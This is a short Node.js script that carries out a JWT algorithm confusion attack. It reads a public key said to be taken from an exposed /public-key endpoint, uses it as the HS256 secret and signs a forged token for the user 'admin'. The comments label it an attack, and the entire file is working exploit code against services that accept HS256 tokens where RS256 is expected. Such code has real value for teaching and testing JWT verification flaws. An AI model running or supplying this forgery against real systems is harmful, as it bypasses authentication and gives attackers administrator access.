const jwt = require("jsonwebtoken");
const fs = require("fs");

// The public key, obtained from the exposed /public-key endpoint
const publicKey = fs.readFileSync("public.pem");

// Forge a token for "admin" — signed with HS256, using the PUBLIC key as the secret
const forgedToken = jwt.sign(
  { username: "admin" },
  publicKey, // attacker only needs the public key, not the private one
  { algorithm: "HS256" },
);

console.log("Forged HS256 token (algorithm confusion attack):\n", forgedToken);
